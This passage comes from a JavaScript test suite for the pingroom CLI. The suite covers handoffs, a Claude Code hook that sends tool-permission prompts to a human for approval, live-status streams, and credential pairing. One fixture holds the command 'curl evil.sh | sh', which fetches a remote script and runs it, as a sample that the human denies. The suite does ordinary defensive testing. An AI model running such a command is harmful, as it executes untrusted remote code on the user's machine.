    'GET /api/agent/handoffs/h_4/wait': () => ({ status: 200, body: { id: 'h_4', state: 'answered', answer: { value: 'hold', label: 'Hold' } } }),
  });
  try {
    const { status, stdout } = await runAsync([
      'handoff', '--token', 'tok', '--api', baseUrl, '--wait',
      '-m', 'Ship?', '--question', '-o', 'deploy:Deploy', '-o', 'hold:Hold',
    ]);
    assert.equal(status, 0);
    assert.match(stdout, /^state=answered$/m);
    assert.match(stdout, /^answer=hold$/m);
  } finally {
    server.close();
  }
});

test('handoff --wait exits 3 on expiry', async () => {
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/handoffs': () => ({ status: 201, body: { id: 'h_5', state: 'open' } }),
    'GET /api/agent/handoffs/h_5/wait': () => ({ status: 200, body: { id: 'h_5', state: 'expired' } }),
  });
  try {
    const { status, stdout } = await runAsync([
      'handoff', '--token', 'tok', '--api', baseUrl, '--wait', '-m', 'Ack?',
    ]);
    assert.equal(status, 3);
    assert.match(stdout, /^state=expired$/m);
  } finally {
    server.close();
  }
});

test('handoff exits 4 on 409 recipient_not_ready', async () => {
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/handoffs': () => ({ status: 409, body: { code: 'recipient_not_ready', message: 'no device' } }),
  });
  try {
    const { status, stderr } = await runAsync([
      'handoff', '--token', 'tok', '--api', baseUrl, '-m', 'Ack?',
    ]);
    assert.equal(status, 4);
    assert.match(stderr, /recipient not ready/);
  } finally {
    server.close();
  }
});

test('handoff exits 1 on a generic server error', async () => {
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/handoffs': () => ({ status: 503, body: { code: 'capability_check_unavailable', message: 'down' } }),
  });
  try {
    const { status, stderr } = await runAsync([
      'handoff', '--token', 'tok', '--api', baseUrl, '-m', 'Ack?',
    ]);
    assert.equal(status, 1);
    assert.match(stderr, /handoff failed/);
  } finally {
    server.close();
  }
});

// ---------------------------------------------------------------------------
// hook — Claude Code integration
// ---------------------------------------------------------------------------

/** Run the CLI with a hook event piped to stdin, resolving on close. */
function runHook(args, stdin, env = {}) {
  return new Promise((resolve, reject) => {
    const child = spawn(process.execPath, [CLI, 'hook', ...args], {
      env: { ...baseEnv(), ...env },
    });
    let stdout = '';
    let stderr = '';
    child.stdout.on('data', (c) => (stdout += c));
    child.stderr.on('data', (c) => (stderr += c));
    child.on('error', reject);
    child.on('close', (status) => resolve({ status, stdout, stderr }));
    child.stdin.end(typeof stdin === 'string' ? stdin : JSON.stringify(stdin ?? {}));
  });
}

test('hook --print-config prints a pasteable settings.json with the pinned version', async () => {
  const { status, stdout } = await runHook(['--print-config'], '');
  assert.equal(status, 0);
  assert.match(stdout, /~\/\.claude\/settings\.json/);
  assert.match(stdout, /"PreToolUse"/);
  assert.match(stdout, /"matcher": "Bash"/);
  assert.match(stdout, /npx --yes @pingroom\/cli@0\.6\.0 hook/);
});

test('hook Stop pings the room with the last assistant message', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'pingroom-cli-transcript-'));
  const transcript = join(dir, 'session.jsonl');
  const lines = [
    JSON.stringify({ type: 'user', message: { role: 'user', content: 'hi' } }),
    JSON.stringify({ type: 'assistant', message: { role: 'assistant', content: [{ type: 'text', text: 'Refactored auth module, 3 files changed.' }] } }),
  ].join('\n');
  const { writeFileSync } = await import('node:fs');
  writeFileSync(transcript, lines);

  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/rooms/ab12cd/notifications': () => ({ status: 201, body: { id: 'n1' } }),
  });
  try {
    const event = { hook_event_name: 'Stop', session_id: 's-1', cwd: '/work', transcript_path: transcript };
    const { status, stderr } = await runHook(
      ['--api', baseUrl], event,
      { PINGROOM_TOKEN: 'tok', PINGROOM_ROOM: 'ab12cd' },
    );
    assert.equal(status, 0, stderr);
    assert.equal(received[0].path, '/api/agent/rooms/ab12cd/notifications');
    assert.equal(received[0].auth, 'Bearer tok');
    const body = JSON.parse(received[0].body);
    assert.equal(body.title, 'Claude finished');
    assert.equal(body.message, 'Refactored auth module, 3 files changed.');
    assert.equal(body.correlation_id, 's-1');
    assert.deepEqual(body.data, { event: 'Stop', session_id: 's-1', cwd: '/work' });
  } finally {
    server.close();
    rmSync(dir, { recursive: true, force: true });
  }
});

test('hook PreToolUse asks a question and returns allow when approved', async () => {
  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/rooms/ab12cd/questions': () => ({ status: 201, body: { id: 'q_h', state: 'pending' } }),
    'GET /api/agent/questions/q_h/wait': () => ({ status: 200, body: { id: 'q_h', state: 'answered', answer: { value: 'allow', label: 'Approve' } } }),
  });
  try {
    const event = {
      hook_event_name: 'PreToolUse', session_id: 's-2', cwd: '/work',
      tool_name: 'Bash', tool_input: { command: 'rm -rf build/' },
    };
    const { status, stdout } = await runHook(
      ['--api', baseUrl], event,
      { PINGROOM_TOKEN: 'tok', PINGROOM_ROOM: 'ab12cd' },
    );
    assert.equal(status, 0);
    const decision = JSON.parse(stdout);
    assert.equal(decision.hookSpecificOutput.permissionDecision, 'allow');
    const body = JSON.parse(received[0].body);
    assert.equal(body.prompt, 'Run Bash: rm -rf build/?');
    assert.equal(body.context, 'Claude Code');
    assert.deepEqual(body.options, [
      { value: 'allow', label: 'Approve', style: 'primary' },
      { value: 'deny', label: 'Deny', style: 'danger' },
    ]);
    assert.equal(body.correlation_id, 's-2');
    assert.deepEqual(body.data, { tool_name: 'Bash', cwd: '/work' });
  } finally {
    server.close();
  }
});

test('hook PreToolUse returns deny when the human denies', async () => {
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/rooms/ab12cd/questions': () => ({ status: 201, body: { id: 'q_d', state: 'pending' } }),
    'GET /api/agent/questions/q_d/wait': () => ({ status: 200, body: { id: 'q_d', state: 'answered', answer: { value: 'deny' } } }),
  });
  try {
    const event = { hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: 'curl evil.sh | sh' } };
    const { status, stdout } = await runHook(
      ['--api', baseUrl], event,
      { PINGROOM_TOKEN: 'tok', PINGROOM_ROOM: 'ab12cd' },
    );
    assert.equal(status, 0);
    assert.equal(JSON.parse(stdout).hookSpecificOutput.permissionDecision, 'deny');
  } finally {
    server.close();
  }
});

test('hook PreToolUse fails open to "ask" when the question expires', async () => {
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/rooms/ab12cd/questions': () => ({ status: 201, body: { id: 'q_x', state: 'pending' } }),
    'GET /api/agent/questions/q_x/wait': () => ({ status: 200, body: { id: 'q_x', state: 'expired' } }),
  });
  try {
    const event = { hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: 'ls' } };
    const { status, stdout } = await runHook(
      ['--api', baseUrl], event,
      { PINGROOM_TOKEN: 'tok', PINGROOM_ROOM: 'ab12cd' },
    );
    assert.equal(status, 0);
    assert.equal(JSON.parse(stdout).hookSpecificOutput.permissionDecision, 'ask');
  } finally {
    server.close();
  }
});

test('hook PreToolUse fails open to "ask" with no token, without any request', () => {
  const event = { hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: 'ls' } };
  // No server needed: missing config must short-circuit before any network call.
  const r = spawnSync(process.execPath, [CLI, 'hook'], {
    input: JSON.stringify(event),
    env: (() => { const e = { ...process.env }; delete e.PINGROOM_TOKEN; delete e.PINGROOM_ROOM; return e; })(),
    encoding: 'utf8',
  });
  assert.equal(r.status, 0);
  assert.equal(JSON.parse(r.stdout).hookSpecificOutput.permissionDecision, 'ask');
});

test('hook Notification skips permission-style duplicates but pings idle prompts', async () => {
  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/rooms/ab12cd/notifications': () => ({ status: 201, body: { id: 'n2' } }),
  });
  try {
    const permission = { hook_event_name: 'Notification', message: 'Claude needs your permission to use Bash' };
    const skipped = await runHook(['--api', baseUrl], permission, { PINGROOM_TOKEN: 'tok', PINGROOM_ROOM: 'ab12cd' });
    assert.equal(skipped.status, 0);
    assert.equal(received.length, 0);

    const idle = { hook_event_name: 'Notification', message: 'Claude is waiting for your input' };
    const pinged = await runHook(['--api', baseUrl], idle, { PINGROOM_TOKEN: 'tok', PINGROOM_ROOM: 'ab12cd' });
    assert.equal(pinged.status, 0);
    assert.equal(received.length, 1);
    assert.equal(JSON.parse(received[0].body).message, 'Claude is waiting for your input');
  } finally {
    server.close();
  }
});

test('hook notify events never fail the agent when the ping errors', async () => {
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/rooms/ab12cd/notifications': () => ({ status: 500, body: { message: 'boom' } }),
  });
  try {
    const event = { hook_event_name: 'Stop' };
    const { status, stderr } = await runHook(['--api', baseUrl], event, { PINGROOM_TOKEN: 'tok', PINGROOM_ROOM: 'ab12cd' });
    assert.equal(status, 0);
    assert.match(stderr, /hook ping failed/);
  } finally {
    server.close();
  }
});

// ---------------------------------------------------------------------------
// live — live-status streams
// ---------------------------------------------------------------------------

test('exit 2: live needs a subcommand', () => {
  const { status, stderr } = run(['live', '-c', 'x']);
  assert.equal(status, 2);
  assert.match(stderr, /live needs a subcommand/);
});

test('exit 2: live requires a correlation id', () => {
  const { status, stderr } = run(['live', 'start']);
  assert.equal(status, 2);
  assert.match(stderr, /--correlation-id is required/);
});

test('exit 2: live rejects re-templating on update', () => {
  const { status, stderr } = run(['live', 'update', '-c', 'x', '--template', 'metrics']);
  assert.equal(status, 2);
  assert.match(stderr, /fixed at stream creation/);
});

test('exit 2: live validates --progress bounds', () => {
  const { status, stderr } = run(['live', 'update', '-c', 'x', '--progress', '5']);
  assert.equal(status, 2);
  assert.match(stderr, /--progress must be at most 1/);
});

test('exit 2: live validates the --steps label count', () => {
  const { status, stderr } = run(['live', 'start', '-c', 'x', '--steps', 'only-one']);
  assert.equal(status, 2);
  assert.match(stderr, /between 2 and 8/);
});

test('live start posts a steps stream to the agent route', async () => {
  const received = [];
  const { server, baseUrl } = await startServer((req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      received.push({ method: req.method, url: req.url, auth: req.headers.authorization, body });
      res.writeHead(201, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ notification_id: 'n1', correlation_id: 'rel-1', state: 'started' }));
    });
  });
  try {
    const { status, stdout } = await runAsync([
      'live', 'start', '--token', 'tok', '--room', 'ab12cd', '--api', baseUrl,
      '-c', 'rel-1', '--template', 'steps', '--steps', 'Build, Test ,Ship', '-t', 'Deploy',
    ]);
    assert.equal(status, 0);
    assert.match(stdout, /live start → started/);
    assert.equal(received.length, 1);
    assert.equal(received[0].url, '/api/agent/rooms/ab12cd/live');
    assert.equal(received[0].auth, 'Bearer tok');
    assert.deepEqual(JSON.parse(received[0].body), {
      correlation_id: 'rel-1',
      live_status: { state: 'running', template: 'steps', steps: ['Build', 'Test', 'Ship'] },
      title: 'Deploy',
    });
  } finally {
    server.close();
  }
});

test('live end sends a terminal ping, and --failed flips the state', async () => {
  const received = [];
  const { server, baseUrl } = await startServer((req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      received.push(JSON.parse(body));
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ state: 'done' }));
    });
  });
  try {
    await runAsync(['live', 'end', '--token', 't', '--room', 'r', '--api', baseUrl, '-c', 'c1', '-m', 'Shipped']);
    await runAsync(['live', 'end', '--token', 't', '--room', 'r', '--api', baseUrl, '-c', 'c1', '--failed']);

    assert.equal(received[0].live_status.state, 'done');
    assert.equal(received[0].live_status.message, 'Shipped');
    assert.equal(received[1].live_status.state, 'failed');
  } finally {
    server.close();
  }
});

test('live works through a room webhook without a token', async () => {
  const received = [];
  const { server, baseUrl } = await startServer((req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      received.push({ url: req.url, body: JSON.parse(body) });
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: true, live_status: { state: 'running' } }));
    });
  });
  try {
    const { status } = await runAsync([
      'live', 'update', '-w', `${baseUrl}/api/webhooks/ab12cd/secret`,
      '-c', 'c2', '--progress', '0.7', '--metric', 'RPS:1.2k',
    ]);
    assert.equal(status, 0);
    assert.equal(received[0].url, '/api/webhooks/ab12cd/secret');
    assert.deepEqual(received[0].body.live_status, {
      state: 'running', progress: 0.7, metrics: [{ label: 'RPS', value: '1.2k' }],
    });
  } finally {
    server.close();
  }
});

test('live start expresses the question template via --option', async () => {
  const received = [];
  const { server, baseUrl } = await startServer((req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      received.push(JSON.parse(body));
      res.writeHead(201, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ state: 'started' }));
    });
  });
  try {
    // A bare token is both value and label; the first colon splits the rest.
    // `--accent-override` normalizes a bare hex back to `#rrggbb` so a shell
    // that ate an unquoted `#` still produces a valid payload.
    const { status } = await runAsync([
      'live', 'start', '--token', 't', '--room', 'r', '--api', baseUrl,
      '-c', 'q1', '--template', 'question', '--prompt', 'Deploy where?',
      '--option', 'prod:Production', '--option', 'staging',
      '--accent-override', 'E33122',
    ]);
    assert.equal(status, 0);
    assert.deepEqual(received[0].live_status, {
      state: 'running',
      prompt: 'Deploy where?',
      template: 'question',
      options: [
        { value: 'prod', label: 'Production' },
        { value: 'staging', label: 'staging' },
      ],
      accent_override: '#e33122',
    });
  } finally {
    server.close();
  }
});

test('live start expresses the matchup template via --left/--right/--center', async () => {
  const received = [];
  const { server, baseUrl } = await startServer((req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      received.push(JSON.parse(body));
      res.writeHead(201, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ state: 'started' }));
    });
  });
  try {
    const { status } = await runAsync([
      'live', 'start', '--token', 't', '--room', 'r', '--api', baseUrl,
      '-c', 'm1', '--template', 'matchup',
      '--left', 'ARS:2', '--right', 'CHE:1', '--center', "68'",
    ]);
    assert.equal(status, 0);
    assert.deepEqual(received[0].live_status, {
      state: 'running',
      template: 'matchup',
      left: { label: 'ARS', value: '2' },
      right: { label: 'CHE', value: '1' },
      center: "68'",
    });
  } finally {
    server.close();
  }
});

test('live rejects malformed --option, --left, and --accent-override', async () => {
  const bad = [
    [['--option', ':nope'], /--option needs a value/],
    [['--left', 'ARS'], /--left must be "label:value"/],
    [['--right', 'CHE'], /--right must be "label:value"/],
    [['--accent-override', 'nothex'], /6-digit hex color/],
  ];
  for (const [extra, pattern] of bad) {
    const { status, stderr } = await runAsync([
      'live', 'start', '--token', 't', '--room', 'r', '--api', 'https://example.com',
      '-c', 'c1', ...extra,
    ]);
    assert.equal(status, 2);
    assert.match(stderr, pattern);
  }
});

test('live get reads a stream back and prints its state', async () => {
  const { server, baseUrl } = await startServer((req, res) => {
    assert.equal(req.method, 'GET');
    assert.equal(req.url, '/api/agent/rooms/ab12cd/live/c3');
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ state: 'running', progress: 0.5 }));
  });
  try {
    const { status, stdout } = await runAsync([
      'live', 'get', '--token', 't', '--room', 'ab12cd', '--api', baseUrl, '-c', 'c3',
    ]);
    assert.equal(status, 0);
    assert.equal(stdout.trim(), 'running');
  } finally {
    server.close();
  }
});

test('live surfaces the free-tier quota rejection', async () => {
  const { server, baseUrl } = await startServer((req, res) => {
    res.writeHead(402, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ code: 'free_limit_reached', message: 'Free accounts can start 5 live streams per day.' }));
  });
  try {
    const { status, stderr } = await runAsync([
      'live', 'start', '--token', 't', '--room', 'r', '--api', baseUrl, '-c', 'c4',
    ]);
    assert.equal(status, 1);
    assert.match(stderr, /live start failed: Free accounts can start 5/);
  } finally {
    server.close();
  }
});

test('exit 2: live rejects an unknown --category', () => {
  const { status, stderr } = run(['live', 'start', '-c', 'x', '--category', 'urgent']);
  assert.equal(status, 2);
  assert.match(stderr, /--category must be status, steps or alert/);
});

test('exit 2: live rejects --category on update', () => {
  const { status, stderr } = run(['live', 'update', '-c', 'x', '--category', 'alert']);
  assert.equal(status, 2);
  assert.match(stderr, /fixed at stream creation/);
});

test('live start sends category=alert for a time-sensitive stream', async () => {
  const received = [];
  const { server, baseUrl } = await startServer((req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      received.push(JSON.parse(body));
      res.writeHead(201, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ state: 'started' }));
    });
  });
  try {
    const { status } = await runAsync([
      'live', 'start', '--token', 't', '--room', 'r', '--api', baseUrl,
      '-c', 'incident-1', '--category', 'alert', '-m', '5xx climbing',
    ]);
    assert.equal(status, 0);
    // `alert` is the only urgency lever that does not also demand an ack.
    assert.deepEqual(received[0].live_status, {
      state: 'running', category: 'alert', message: '5xx climbing',
    });
  } finally {
    server.close();
  }
});

// ---------------------------------------------------------------------------
// Connecting: credential store, config, pairing, logout
// ---------------------------------------------------------------------------

/** A fresh, isolated PINGROOM_HOME. */
function newHome() {
  return mkdtempSync(join(tmpdir(), 'pingroom-home-'));
}

/** Seed a credentials.json the way a completed pairing would have written it. */
function seedCredential(home, cred) {
  writeFileSync(join(home, 'credentials.json'), `${JSON.stringify({ version: 1, ...cred })}\n`, { mode: 0o600 });
}

/**
 * Stub the pairing endpoints. `statuses` is consumed one entry per poll; the
 * last entry repeats. `rounds` counts how many times pairing was restarted.
 */
function pairingServer(statuses, { onRegister } = {}) {
  const received = [];
  let poll = 0;
  return startServer((req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      const path = req.url.split('?')[0];
      received.push({ method: req.method, path, auth: req.headers['authorization'], body });
      let out;
      if (path === '/api/agent/auth') {
        if (onRegister) onRegister();
        out = { status: 200, body: { credential: 'pre_claim_jwt', credential_type: 'pre_claim', expires_in: 900, scopes: [] } };
      } else if (path === '/api/agent/auth/pair/start') {
        out = {
          status: 200,
          body: {
            pair_token: 'p'.repeat(64),
            pair_url: `https://pingroom.io/app/agents/pair?token=${'p'.repeat(64)}`,
            expires_in: 900,
            poll_interval_ms: 10,
          },
        };
      } else if (path === '/api/agent/auth/pair/status') {
        out = { status: 200, body: statuses[Math.min(poll++, statuses.length - 1)] };
      } else {
        out = { status: 404, body: { message: 'no route' } };
      }
      res.writeHead(out.status, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(out.body));
    });
  }).then((s) => ({ ...s, received }));
}

const ACTIVE_PAIR = {
  status: 'active',
  credential: 'active_jwt',
  credential_type: 'active',
  expires_in: 0,
  handle: 'agt_ab12cd34ef',
  scopes: ['pingroom:broadcast:send'],
  account: { name: 'Mahdi' },
  room: { invite_code: 'ABC123', name: 'Project X' },
};

test('stored credential supplies the token and the room when no env/flag does', async () => {
  const home = newHome();
  seedCredential(home, { token: 'stored_tok', handle: 'agt_x', room: { invite_code: 'ABC123', name: 'Project X' } });
  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/rooms/ABC123/notifications': () => ({ status: 201, body: { id: 'n1' } }),
  });
  try {
    const { status, stdout } = await runAsync(['ping', '--api', baseUrl, '-m', 'hi'], { PINGROOM_HOME: home });
    assert.equal(status, 0);
    assert.match(stdout, /ping sent/);
    assert.equal(received[0].path, '/api/agent/rooms/ABC123/notifications');
    assert.equal(received[0].auth, 'Bearer stored_tok');
  } finally {
    server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('PINGROOM_TOKEN always wins over the stored credential (CI is unaffected)', async () => {
  const home = newHome();
  seedCredential(home, { token: 'stored_tok', handle: 'agt_x', room: { invite_code: 'ABC123', name: 'Project X' } });
  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/rooms/ABC123/notifications': () => ({ status: 201, body: { id: 'n1' } }),
  });
  try {
    const { status } = await runAsync(['ping', '--api', baseUrl, '-m', 'hi'], { PINGROOM_HOME: home, PINGROOM_TOKEN: 'env_tok' });
    assert.equal(status, 0);
    assert.equal(received[0].auth, 'Bearer env_tok');
  } finally {
    server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('--token outranks both the env var and the stored credential', async () => {
  const home = newHome();
  seedCredential(home, { token: 'stored_tok', room: { invite_code: 'ABC123' } });
  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/rooms/ABC123/notifications': () => ({ status: 201, body: { id: 'n1' } }),
  });
  try {
    const { status } = await runAsync(
      ['ping', '--api', baseUrl, '-m', 'hi', '--token', 'flag_tok'],
      { PINGROOM_HOME: home, PINGROOM_TOKEN: 'env_tok' },
    );
    assert.equal(status, 0);
    assert.equal(received[0].auth, 'Bearer flag_tok');
  } finally {
    server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('a corrupt credentials.json degrades to "not connected" instead of crashing', () => {
  const home = newHome();
  try {
    writeFileSync(join(home, 'credentials.json'), 'not json at all');
    const { status, stderr } = run(['ask', '--room', 'ab12cd', '-p', 'Deploy?'], { PINGROOM_HOME: home });
    assert.equal(status, 2);
    assert.match(stderr, /agent token is required/);
  } finally {
    rmSync(home, { recursive: true, force: true });
  }
});

test('config set/get/list round-trips and rejects unknown keys and bad values', () => {
  const home = newHome();
  try {
    assert.match(run(['config', 'list'], { PINGROOM_HOME: home }).stdout, /no settings stored/);

    const set = run(['config', 'set', 'default_room', 'ab12cd'], { PINGROOM_HOME: home });
    assert.equal(set.status, 0);
    assert.match(set.stdout, /^default_room=ab12cd$/m);

    assert.equal(run(['config', 'get', 'default_room'], { PINGROOM_HOME: home }).stdout, 'ab12cd\n');
    // Unset keys print nothing and still exit 0, so `$(pingroom config get …)` is safe.
    const unset = run(['config', 'get', 'api_url'], { PINGROOM_HOME: home });
    assert.equal(unset.status, 0);
    assert.equal(unset.stdout, '');

    run(['config', 'set', 'api_url', 'https://api.example.test'], { PINGROOM_HOME: home });
    const listed = run(['config', 'list'], { PINGROOM_HOME: home });
    assert.match(listed.stdout, /^default_room=ab12cd$/m);
    assert.match(listed.stdout, /^api_url=https:\/\/api\.example\.test$/m);

    const unknown = run(['config', 'set', 'nope', 'x'], { PINGROOM_HOME: home });
    assert.equal(unknown.status, 2);
    assert.match(unknown.stderr, /unknown config key/);

    const cleartext = run(['config', 'set', 'api_url', 'http://evil.example'], { PINGROOM_HOME: home });
    assert.equal(cleartext.status, 2);
    assert.match(cleartext.stderr, /must use https/);

    // An empty value clears the key rather than storing "".
    assert.match(run(['config', 'set', 'api_url', ''], { PINGROOM_HOME: home }).stdout, /api_url cleared/);
    assert.equal(run(['config', 'get', 'api_url'], { PINGROOM_HOME: home }).stdout, '');

    const noSub = run(['config'], { PINGROOM_HOME: home });
    assert.equal(noSub.status, 2);
    assert.match(noSub.stderr, /config needs a subcommand/);
  } finally {
    rmSync(home, { recursive: true, force: true });
  }
});

test('config default_room fills in for --room, and the flag/env still outrank it', async () => {
  const home = newHome();
  run(['config', 'set', 'default_room', 'cfgroom'], { PINGROOM_HOME: home });
  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/rooms/cfgroom/questions': () => ({ status: 201, body: { id: 'q_cfg', state: 'pending' } }),
    'POST /api/agent/rooms/envroom/questions': () => ({ status: 201, body: { id: 'q_env', state: 'pending' } }),
    'POST /api/agent/rooms/flagroom/questions': () => ({ status: 201, body: { id: 'q_flag', state: 'pending' } }),
  });
  try {
    const cfg = await runAsync(['ask', '--api', baseUrl, '--token', 't', '-p', 'Go?'], { PINGROOM_HOME: home });
    assert.equal(cfg.status, 0);
    assert.equal(cfg.stdout.trim(), 'q_cfg');

    const env = await runAsync(['ask', '--api', baseUrl, '--token', 't', '-p', 'Go?'], { PINGROOM_HOME: home, PINGROOM_ROOM: 'envroom' });
    assert.equal(env.stdout.trim(), 'q_env');

    const flag = await runAsync(
      ['ask', '--api', baseUrl, '--token', 't', '--room', 'flagroom', '-p', 'Go?'],
      { PINGROOM_HOME: home, PINGROOM_ROOM: 'envroom' },
    );
    assert.equal(flag.stdout.trim(), 'q_flag');
    assert.deepEqual(received.map((r) => r.path), [
      '/api/agent/rooms/cfgroom/questions',
      '/api/agent/rooms/envroom/questions',
      '/api/agent/rooms/flagroom/questions',
    ]);
  } finally {
    server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('config api_url becomes the API base when no flag or env var is given', async () => {
  const home = newHome();
  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/rooms/ab12cd/questions': () => ({ status: 201, body: { id: 'q_cfgapi', state: 'pending' } }),
  });
  try {
    // A loopback http base is the one cleartext exception, for local dev.
    run(['config', 'set', 'api_url', baseUrl], { PINGROOM_HOME: home });
    const { status, stdout } = await runAsync(
      ['ask', '--token', 't', '--room', 'ab12cd', '-p', 'Go?'],
      { PINGROOM_HOME: home },
    );
    assert.equal(status, 0);
    assert.equal(stdout.trim(), 'q_cfgapi');
    assert.equal(received.length, 1);
  } finally {
    server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('bare pingroom prints the connected status and the help', () => {
  const home = newHome();
  seedCredential(home, { token: 'stored_tok', handle: 'agt_ab12cd34ef', room: { invite_code: 'ABC123', name: 'Project X' } });
  try {
    const { status, stdout } = run([], { PINGROOM_HOME: home });
    assert.equal(status, 0);
    assert.match(stdout, /Connected as @agt_ab12cd34ef → #Project X/);
    assert.match(stdout, /Default room: ABC123/);
    assert.match(stdout, /pingroom — send a ping/);
  } finally {
    rmSync(home, { recursive: true, force: true });
  }
});

test('bare pingroom reports the env token instead of the stored credential', () => {
  const home = newHome();
  seedCredential(home, { token: 'stored_tok', handle: 'agt_ab12cd34ef' });
  try {
    const { status, stdout } = run([], { PINGROOM_HOME: home, PINGROOM_TOKEN: 'env_tok' });
    assert.equal(status, 0);
    assert.match(stdout, /Using the agent token from PINGROOM_TOKEN/);
    assert.match(stdout, /is ignored while it is set/);
  } finally {
    rmSync(home, { recursive: true, force: true });
  }
});

test('non-TTY: bare pingroom never prompts or draws a QR, and points at PINGROOM_TOKEN', () => {
  // spawnSync pipes both streams, so this is exactly the CI shape. It must
  // return immediately rather than block on an invisible prompt.
  const { status, stdout, stderr } = run([]);
  assert.equal(status, 0);
  assert.match(stderr, /not connected/);
  assert.match(stderr, /PINGROOM_TOKEN/);
  assert.match(stdout, /pingroom — send a ping/);
  assert.doesNotMatch(stdout, /[█▄▀]/);
  assert.doesNotMatch(stdout, /Choose \[1\]/);
});

test('non-TTY: a command needing a credential fails with the usage code, not a prompt', () => {
  for (const argv of [['ask', '--room', 'ab12cd', '-p', 'Deploy?'], ['handoff', '-m', 'Ship it']]) {
    const { status, stdout, stderr } = run(argv);
    assert.equal(status, 2, `${argv[0]} should be a usage error`);
    assert.match(stderr, /PINGROOM_TOKEN/);
    assert.doesNotMatch(stdout, /Choose \[1\]/);
  }
});

test('pairing renders a QR, polls to active, and stores a 0600 credential', async () => {
  const home = newHome();
  const { server, baseUrl, received } = await pairingServer([
    { status: 'pending' },
    { status: 'pending' },
    ACTIVE_PAIR,
  ]);
  try {
    const { status, stdout } = await runAsync(
      ['--api', baseUrl],
      { PINGROOM_HOME: home, PINGROOM_FORCE_TTY: '1', COLUMNS: '120' },
      { stdin: '\n' }, // accept the default picker choice (QR)
    );
    assert.equal(status, 0);
    // The QR itself, then the URL fallback, then the confirmation.
    assert.match(stdout, /[█▄▀]{4}/);
    assert.match(stdout, /Or open: https:\/\/pingroom\.io\/app\/agents\/pair\?token=p{64}/);
    assert.match(stdout, /✓ Connected as @agt_ab12cd34ef → #Project X/);

    const paths = received.map((r) => r.path);
    assert.equal(paths[0], '/api/agent/auth');
    assert.equal(paths[1], '/api/agent/auth/pair/start');
    assert.deepEqual(paths.slice(2), Array(3).fill('/api/agent/auth/pair/status'));

    // Anonymous registration, with the scopes the CLI actually uses.
    const register = JSON.parse(received[0].body);
    assert.equal(register.type, 'anonymous');
    assert.ok(register.scopes.includes('pingroom:handoffs:create'));
    assert.ok(register.scopes.includes('pingroom:questions:ask'));
    // pair/start and every poll present the pre-claim credential.
    assert.equal(received[1].auth, 'Bearer pre_claim_jwt');
    assert.deepEqual(JSON.parse(received[1].body).scopes, register.scopes);
    for (const poll of received.slice(2)) assert.equal(poll.auth, 'Bearer pre_claim_jwt');

    const credPath = join(home, 'credentials.json');
    const cred = JSON.parse(readFileSync(credPath, 'utf8'));
    assert.equal(cred.token, 'active_jwt');
    assert.equal(cred.handle, 'agt_ab12cd34ef');
    assert.deepEqual(cred.room, { invite_code: 'ABC123', name: 'Project X' });
    assert.equal(statSync(credPath).mode & 0o777, 0o600);
    assert.equal(statSync(home).mode & 0o777, 0o700);

    // The paired room is the last-resort fallback for --room.
    assert.equal(run(['config', 'get', 'default_room'], { PINGROOM_HOME: home }).stdout, '');
    assert.match(run([], { PINGROOM_HOME: home }).stdout, /Default room: ABC123/);
  } finally {
    server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('pairing offers a fresh QR when the pre-claim window expires', async () => {
  const home = newHome();
  let rounds = 0;
  // First poll expires; after the user accepts a restart the new round is live.
  const { server, baseUrl, received } = await pairingServer(
    [{ status: 'expired' }, ACTIVE_PAIR],
    { onRegister: () => { rounds += 1; } },
  );
  try {
    const { status, stdout } = await runAsync(
      ['--api', baseUrl],
      { PINGROOM_HOME: home, PINGROOM_FORCE_TTY: '1', COLUMNS: '120' },
      { stdin: '1\ny\n' },
    );
    assert.equal(status, 0);
    assert.match(stdout, /That code expired\./);
    assert.match(stdout, /Show a fresh QR code\?/);
    assert.match(stdout, /✓ Connected as @agt_ab12cd34ef/);
    assert.equal(rounds, 2, 'a restart must mint a brand new pre-claim registration');
    assert.equal(received.filter((r) => r.path === '/api/agent/auth/pair/start').length, 2);
    assert.equal(JSON.parse(readFileSync(join(home, 'credentials.json'), 'utf8')).token, 'active_jwt');
  } finally {
    server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('declining a fresh QR exits 3 and writes no credential', async () => {
